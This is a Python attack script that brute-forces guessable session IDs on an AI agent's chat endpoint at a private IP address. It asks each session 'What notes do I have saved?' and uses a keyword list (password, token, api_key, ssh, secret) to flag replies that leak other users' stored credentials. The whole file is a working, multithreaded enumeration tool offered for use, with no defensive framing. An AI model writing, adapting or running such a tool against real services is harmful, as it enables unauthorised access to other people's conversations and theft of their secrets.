#!/usr/bin/env python3
"""
session_enum.py - Brute-force agent sessions for sensitive data
"""

import requests
import argparse
import concurrent.futures
from datetime import datetime, timedelta

KEYWORDS = ["password", "token", "key", "secret", "credential",
            "api_key", "access_key", "ssh", "private", "jira"]

EMPTY = ["haven't saved", "no notes", "no reminders", "nothing stored",
         "haven't stored", "no saved", "currently have no",
         "couldn't find", "unable to find", "no entries"]

def check_session(session: requests.Session, target: str, sid: str) -> None:
    try:
        r = session.post(target, json={
            "message": "What notes do I have saved?",
            "session_id": sid
        }, timeout=15)
        
        # Ensure the response is valid JSON before processing
        try:
            resp_data = r.json()
        except ValueError:
            return

        resp = resp_data.get("response", "")
        if not resp:
            return

        # Lowercase once for efficiency
        resp_lower = resp.lower()

        if any(e in resp_lower for e in EMPTY):
            return

        if any(kw in resp_lower for kw in KEYWORDS):
            print(f"\n[!] SENSITIVE - {sid}:")
            print(f"  {resp[:200]}")
        else:
            print(f"[+] {sid}: {resp[:80]}...")

    except requests.exceptions.RequestException:
        # Ignore timeouts and connection errors quietly
        pass

def main():
    parser = argparse.ArgumentParser(description="Enumerate agent sessions for sensitive data")
    parser.add_argument("-t", "--target", default="http://192.168.214.24:8018/chat", help="Target URL")
    parser.add_argument("-d", "--days-back", type=int, default=14, help="Number of days back to check")
    parser.add_argument("-c", "--max-counter", type=int, default=20, help="Max session counter per day")
    parser.add_argument("-w", "--workers", type=int, default=15, help="Number of concurrent worker threads")
    args = parser.parse_args()

    # Base date as seen in your original script
    current_date = datetime(2026, 3, 25)
    end_date = current_date - timedelta(days=args.days_back)
    
    # Pre-generate all the session IDs to test
    session_ids = []
    d = current_date
    while d >= end_date:
        date_str = d.strftime("%Y%m%d")
        for i in range(1, args.max_counter + 1):
            session_ids.append(f"MC-{date_str}-{i:04d}")
        d -= timedelta(days=1)

    print(f"[*] Starting enumeration of {len(session_ids)} total sessions using {args.workers} threads...")

    # Use a session for connection pooling to speed up requests
    with requests.Session() as http_session:
        # Spin up a thread pool for concurrency
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as executor:
            # Submit all session checking tasks to the thread pool
            futures = [executor.submit(check_session, http_session, args.target, sid) for sid in session_ids]
            
            # Wait for all tasks to complete
            concurrent.futures.wait(futures)
            
    print("\n[*] Enumeration complete.")

if __name__ == "__main__":
    main()